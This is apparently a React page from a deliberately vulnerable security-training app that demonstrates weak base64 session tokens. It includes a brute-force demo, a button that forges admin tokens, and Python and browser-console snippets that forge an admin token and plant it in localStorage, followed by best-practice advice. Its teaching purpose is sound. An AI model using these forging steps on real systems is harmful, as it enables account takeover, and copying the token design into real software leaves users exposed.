import React, { useState } from 'react';
import axios from 'axios';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

function Session() {
  const [tokenData, setTokenData] = useState(null);
  const [userId, setUserId] = useState('');
  const [generatedTokens, setGeneratedTokens] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  const [decodedToken, setDecodedToken] = useState(null);

  const generateToken = async () => {
    setIsLoading(true);
    try {
      // FIX: Correct API endpoint - /api/session (not /api/session with user_id param)
      const response = await axios.get(`${API_URL}/api/session`, { 
        params: { username: userId || 'guest' }
      });
      
      if (response.data.success) {
        const token = response.data.token;
        const decoded = atob(token);
        
        setTokenData({
          session_token: token,
          token_format: response.data.token_format,
          token_decoded: decoded,
          timestamp: new Date().toISOString(),
          expires_in: response.data.expiresIn,
          expires_at: response.data.expiresAt
        });
        
        // Add to generated tokens list
        setGeneratedTokens(prev => [{
          id: Date.now(),
          token: token,
          decoded: decoded,
          timestamp: new Date().toLocaleTimeString(),
          userId: userId || 'guest'
        }, ...prev].slice(0, 10));
      }
    } catch (error) {
      console.error('Error generating token:', error);
      alert('Error generating token. Make sure the server is running.');
    } finally {
      setIsLoading(false);
    }
  };

  const bruteForceDemo = async () => {
    setGeneratedTokens([]);
    setIsLoading(true);
    const userIds = ['guest', 'admin', 'user1', 'user2', 'user3'];
    
    for (let i = 0; i < userIds.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 500));
      try {
        const response = await axios.get(`${API_URL}/api/session`, { 
          params: { username: userIds[i] }
        });
        
        if (response.data.success) {
          const token = response.data.token;
          const decoded = atob(token);
          
          setGeneratedTokens(prev => [{
            id: Date.now(),
            token: token,
            decoded: decoded,
            timestamp: new Date().toLocaleTimeString(),
            userId: userIds[i]
          }, ...prev]);
        }
      } catch (error) {
        console.error('Brute force error:', error);
      }
    }
    setIsLoading(false);
  };

  const decodeToken = (token) => {
    try {
      const decoded = atob(token);
      const parts = decoded.split(':');
      return {
        raw: decoded,
        username: parts[0],
        timestamp: parts[1],
        date: new Date(parseInt(parts[1])).toLocaleString(),
        isValid: parts.length === 2
      };
    } catch {
      return null;
    }
  };

  const handleTokenClick = (token) => {
    const decoded = decodeToken(token);
    setDecodedToken(decoded);
  };

  const forgeToken = (targetUsername) => {
    if (!tokenData) {
      alert('Generate a token first');
      return;
    }
    
    const currentDecoded = decodeToken(tokenData.session_token);
    if (currentDecoded) {
      const forgedToken = btoa(`${targetUsername}:${currentDecoded.timestamp}`);
      setDecodedToken({
        ...currentDecoded,
        forged: true,
        forgedToken: forgedToken,
        forgedUsername: targetUsername
      });
    }
  };

  return (
    <div className="session-container">
      <div className="page-header">
        <div>
          <h2>🔐 Session Management (Vulnerable Demo)</h2>
          <p>Understanding weak session token vulnerabilities</p>
        </div>
        <div className="vuln-badge high">⚠️ WEAK SESSION TOKENS</div>
      </div>

      <div className="warning-box high">
        <strong>⚠️ SECURITY WARNING</strong>
        <p>Session tokens are generated using weak base64 encoding and are easily predictable! This is a demonstration of insecure session management.</p>
      </div>

      <div className="session-grid">
        <div className="token-generator">
          <h3>🎯 Token Generator (Vulnerable)</h3>
          <div className="generator-controls">
            <input
              type="text"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              placeholder="Username (guest, admin, etc.)"
              className="user-id-input"
            />
            <button onClick={generateToken} disabled={isLoading} className="generate-btn">
              {isLoading ? 'Generating...' : 'Generate Token'}
            </button>
            <button onClick={bruteForceDemo} disabled={isLoading} className="brute-btn">
              🔓 Brute Force Demo
            </button>
          </div>

          {tokenData && (
            <div className="token-display">
              <div className="token-header">Generated Token</div>
              <div className="token-value" onClick={() => handleTokenClick(tokenData.session_token)}>
                <code>{tokenData.session_token}</code>
              </div>
              <div className="token-info">
                <div><strong>Format:</strong> {tokenData.token_format}</div>
                <div><strong>Decoded:</strong> <code>{tokenData.token_decoded}</code></div>
                <div><strong>Expires:</strong> {new Date(tokenData.expires_at).toLocaleString()}</div>
                <div><strong>Expires In:</strong> {tokenData.expires_in} seconds</div>
              </div>
              
              <div className="token-actions">
                <button onClick={() => forgeToken('admin')} className="forge-btn">
                  🔧 Forge Admin Token
                </button>
                <button onClick={() => forgeToken('john_doe')} className="forge-btn">
                  🔧 Forge John Doe Token
                </button>
              </div>
            </div>
          )}

          {decodedToken && (
            <div className="decoded-info">
              <h4>🔓 Token Analysis:</h4>
              <p><strong>Decoded:</strong> <code>{decodedToken.raw}</code></p>
              <p><strong>Username:</strong> {decodedToken.username}</p>
              <p><strong>Timestamp:</strong> {decodedToken.date}</p>
              <p><strong>Valid:</strong> {decodedToken.isValid ? '✅ Yes' : '❌ No'}</p>
              {decodedToken.forged && (
                <div className="forged-info">
                  <p><strong>🎭 Forged Token for {decodedToken.forgedUsername}:</strong></p>
                  <code>{decodedToken.forgedToken}</code>
                  <button 
                    onClick={() => navigator.clipboard.writeText(decodedToken.forgedToken)}
                    className="copy-btn"
                  >
                    📋 Copy Forged Token
                  </button>
                </div>
              )}
            </div>
          )}
        </div>

        <div className="exploit-guide">
          <h3>🔓 How to Exploit Weak Tokens</h3>
          <div className="code-example">
            <h4>Python Exploit Code:</h4>
            <pre>{`
import base64

# Get a valid token
token = "${tokenData?.session_token || 'Z3Vlc3Q6MTczMzQwNDgwMDAwMA=='}"
decoded = base64.b64decode(token).decode()
username, timestamp = decoded.split(':')

print(f"Original: {decoded}")
print(f"Username: {username}, Timestamp: {timestamp}")

# Forge token for admin
new_token = base64.b64encode(f"admin:{timestamp}".encode()).decode()
print(f"Forged Token: {new_token}")

# Use the forged token
headers = {'Authorization': f'Bearer {new_token}'}
# Now you can access admin endpoints!
            `}</pre>
          </div>
          
          <div className="code-example">
            <h4>Browser Console Exploit:</h4>
            <pre>{`
// Get token from localStorage or network tab
const token = "${tokenData?.session_token || 'Z3Vlc3Q6MTczMzQwNDgwMDAwMA=='}";

// Decode token
const decoded = atob(token);
const [username, timestamp] = decoded.split(':');

console.log('Original:', {username, timestamp});

// Forge admin token
const adminToken = btoa(\`admin:$\{timestamp}\`);
console.log('Admin Token:', adminToken);

// Store forged token
localStorage.setItem('session_token', adminToken);
            `}</pre>
          </div>
        </div>
      </div>

      {generatedTokens.length > 0 && (
        <div className="generated-tokens">
          <h3>📋 Recently Generated Tokens</h3>
          <div className="tokens-list">
            {generatedTokens.map((t) => (
              <div key={t.id} className="token-item" onClick={() => handleTokenClick(t.token)}>
                <div className="token-time">{t.timestamp}</div>
                <div className="token-code">
                  <code>{t.token.substring(0, 30)}...</code>
                  <span className="token-decode">→ User: {t.userId}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="info-box">
        <h4>💡 Why Are These Tokens Weak?</h4>
        <p>1. <strong>Predictable Pattern:</strong> Format is always <code>base64(username:timestamp)</code></p>
        <p>2. <strong>No Secret Key:</strong> Tokens don't use HMAC or encryption</p>
        <p>3. <strong>Easily Decodable:</strong> Anyone can decode base64</p>
        <p>4. <strong>Modifiable:</strong> Attacker can change username and re-encode</p>
        <p>5. <strong>No Expiry Validation:</strong> Old tokens work forever</p>
      </div>

      <div className="info-box success">
        <h4>✅ Secure Token Best Practices (JWT):</h4>
        <p>1. Use JWT with strong signing (HS256 or RS256)</p>
        <p>2. Include expiration time (exp claim)</p>
        <p>3. Never store sensitive data in token</p>
        <p>4. Use HTTPS to prevent token interception</p>
        <p>5. Implement token refresh mechanism</p>
      </div>
    </div>
  );
}

export default Session;